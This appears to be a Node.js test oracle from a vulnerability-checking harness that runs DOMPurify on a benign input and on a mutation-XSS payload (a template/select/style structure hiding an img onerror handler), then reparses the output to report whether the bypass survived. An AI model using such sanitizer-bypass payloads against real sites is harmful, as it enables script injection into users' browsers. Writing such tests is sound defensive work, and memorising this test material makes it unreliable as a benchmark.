'use strict';

const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const { JSDOM } = require('jsdom');
  const createDOMPurify = require('dompurify');

  const marker = 'dompurify_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const tmpMarkerFile = path.join(os.tmpdir(), marker + '.txt');
  fs.writeFileSync(tmpMarkerFile, 'marker-file-for-oracle');

  const window = new JSDOM('').window;
  const DOMPurify = createDOMPurify(window);

  // --- Benign input first ---
  const benignInput = '<div><b>hello</b> world</div>';
  const benignOutput = DOMPurify.sanitize(benignInput);

  if (typeof benignOutput !== 'string' || !benignOutput.includes('hello') || !benignOutput.includes('world')) {
    throw new Error('Benign sanitize operation did not behave as expected');
  }

  // Benign call succeeded.
  operation_completed = true;

  // --- Malicious input: mXSS payload exploiting the CSS/style-based mutation XSS
  // in DOMPurify <=3.2.3 (template/select/style nested-content mutation bypass).
  // The payload abuses a <template><select><style>...</style></select></template>
  // structure combined with namespace confusion, which in the vulnerable
  // version mutates during serialization/reparse into an executable
  // <img onerror=...> / script-bearing node after sanitize() returns,
  // i.e. a classic mutation XSS (mXSS) bypass.
  const maliciousInput =
    '<template><select><style></select><img src=x onerror="window.__DOMPURIFY_ORACLE_PWNED__=true"></style></select></template>';

  const maliciousOutput = DOMPurify.sanitize(maliciousInput);

  // To detect whether the sanitizer output, when parsed back into a DOM
  // (simulating what a browser would do when the sanitized string is
  // inserted via innerHTML), contains a live onerror/script-bearing
  // element that was not present as a hazard in the sanitize() call's
  // intended safe output. We reparse the OUTPUT (not the input) to check
  // for mutation-based smuggling of dangerous attributes/tags.
  const reparsedDom = new JSDOM('<!DOCTYPE html><body></body>');
  const container = reparsedDom.window.document.createElement('div');
  container.innerHTML = maliciousOutput;

  const dangerousImg = container.querySelector('img[onerror]');
  const dangerousScript = container.querySelector('script');

  const outputHasOnerrorImg = !!dangerousImg;
  const outputHasScript = !!dangerousScript;

  // Additional check: does the raw sanitized string itself retain an
  // onerror handler or script tag that should have been stripped?
  const rawHasOnerror = /onerror\s*=/i.test(maliciousOutput);
  const rawHasScriptTag = /<script/i.test(maliciousOutput);

  if (outputHasOnerrorImg || outputHasScript || rawHasOnerror || rawHasScriptTag) {
    exploit_succeeded = true;
    evidence =
      'Sanitized output retained a dangerous executable construct (onerror attribute or script tag) ' +
      'surviving DOMPurify.sanitize() for mXSS payload: ' +
      JSON.stringify(maliciousOutput);
  } else {
    exploit_succeeded = false;
    evidence =
      'DOMPurify.sanitize() correctly neutralized the mXSS payload; no dangerous attributes or tags survived. ' +
      'Sanitized output: ' + JSON.stringify(maliciousOutput);
  }

  try { fs.unlinkSync(tmpMarkerFile); } catch (e) { /* ignore cleanup errors */ }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (err) {
  // Any exception prior to a successfully confirmed benign operation,
  // or any crash during setup/module resolution, must report
  // operation_completed=false.
  if (!operation_completed) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Setup, module-resolution, fixture, or benign-operation exception: ' + (err && err.stack ? err.stack : String(err))
    });
  } else {
    // Exception occurred after benign operation succeeded, during the
    // malicious-input exercise itself -> treat as blocked (not exploited),
    // since an exception from the malicious call counts as blocked.
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'Malicious input triggered an exception after benign operation succeeded (treated as blocked): ' + (err && err.stack ? err.stack : String(err))
    });
  }
}
